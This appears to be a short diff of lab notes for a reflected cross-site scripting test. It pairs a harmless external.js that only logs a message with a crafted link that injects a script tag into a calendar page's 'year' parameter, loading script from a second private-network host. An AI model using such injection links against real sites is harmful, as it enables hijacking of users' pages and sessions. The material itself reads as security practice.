@@ -1,0 +1,8 @@
+# external.js
+window.setTimeout(function(){ 
+console.log("WTFFFFFFFFFFFFFFFFFFFF");
+} , 3000);
+
+# XSS hyperlink
+http://172.16.65.130/calendar/calendar.php?year=<script src="http://172.16.65.1/external.js"></script>&month=05#
+
